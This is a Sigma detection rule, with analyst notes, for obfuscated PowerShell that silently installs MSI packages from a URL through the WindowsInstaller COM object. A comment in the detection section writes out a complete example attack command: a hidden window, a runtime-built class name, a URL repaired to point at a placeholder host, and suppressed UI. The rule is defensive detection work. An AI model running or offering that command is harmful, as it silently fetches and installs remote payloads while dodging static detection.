title: Obfuscated PowerShell MSI Install via WindowsInstaller COM
id: 7b6a7418-3afc-11f0-aff4-000d3abf478c
status: experimental
description: |
  Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
  The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., 'indowsInstaller.Installer'.Insert(0,'W')) and correcting
  malformed URLs (e.g., converting 'htps://' to 'https://') at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
  by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
  hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
references:
- https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
- https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
- https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
author: Meroujan Antonyan (vx3r)
date: 2025-05-27
tags:
- attack.stealth
- attack.t1027.010
- attack.t1218.007
- attack.execution
- attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
  selection_img:
  - Image|endswith:
    - '\powershell_ise.exe'
    - '\powershell.exe'
    - '\pwsh.exe'
  - OriginalFileName:
    - 'PowerShell_ISE.EXE'
    - 'PowerShell.EXE'
    - 'pwsh.dll'
  selection_cli:
    CommandLine|contains|all:
    - '-ComObject'
    - 'InstallProduct('
    - '.Insert('
    - 'UILevel'
  condition: all of selection_*
falsepositives:
- Unknown
level: high
note: |
  ### Technical Context

  This rule detects the execution of obfuscated PowerShell commands that utilize the Windows Installer COM object to install MSI packages. Attackers may employ these tactics to run malware payloads or drops silently, leveraging obfuscation techniques to evade detection. The likely objective is to install malicious software without user interaction, often hiding the true nature of the command executed. The detection corresponds to the MITRE ATT&CK techniques T1059.001 (PowerShell) and T1218.007 (Signed Binary Proxy Execution).

  Primary telemetry sources include process creation logs (Windows Event ID 4688) which capture command-line arguments and invoked processes. The impact of this detection is significant, as successful execution can lead to malware installation on affected devices. However, this alert alone does NOT confirm malicious intent, as legitimate usage of PowerShell for administrative tasks can also produce similar behaviors.

  ### Investigation Steps

  - **Check for process origin:** Review the execution file paths of detected processes (Event ID 4688) to confirm if PowerShell was launched from unusual directories (e.g., temp folders or user profiles). Legitimate PowerShell instances typically originate from C:\Windows\System32\.

  - **Inspect command-line arguments for obfuscation:** Analyze command-line arguments (Event ID 4688 > NewProcessName) for the presence of the `-ComObject`, `InstallProduct(`, and `.Insert(` strings. Malicious instances will often exhibit highly obfuscated parameters and unusual concatenations.

  - **Examine original file names:** Verify the `OriginalFileName` of the PowerShell processes against the expected values ('PowerShell.EXE', 'PowerShell_ISE.EXE', 'pwsh.dll'). Deviations may indicate malicious behavior, particularly if the original file names are not consistent with common PowerShell usage.

  - **Identify suppressed UI interactions:** Look for UI interactions associated with the `UILevel` property in the command-line arguments, where a value of 2 typically indicates a headless install with no user prompts. This is a strong indicator of unwanted software installation.

  - **Gather additional context from process trees:** Use Sysmon logs (Event ID 1) to identify parent-child process relationships. Look for processes spawned by suspicious parent activities, as exploitation often involves chaining from other scripts or executables.

  - **Validate the source of MSI installation attempts:** Check if the URLs specified contain anomalous or known risky domains. Evaluate whether MSI installation is occurring from unexpected external sources, particularly with obfuscation techniques evident in the URL.

  ### Prioritization

  Given the impact and likelihood of this behavior being used for malicious purposes, this alert should be considered high priority. The execution of obfuscated PowerShell commands related to MSI installations often suggests an active threat, which is frequently weaponized in attacks targeting enterprise environments.

  ### Blind Spots and Assumptions

  Detection is limited by potential evasion techniques, such as script block logging being disabled or command-line output being suppressed through other means. It assumes that Event ID 4688 and appropriately configured Sysmon logs are consistently generated. Legitimate actions, particularly by systems administrators executing PowerShell scripts for software deployment, may trigger similar alerts. A related detection to strengthen coverage would be monitoring for unusual outbound network connections or DNS queries that align with the installed MSI package.

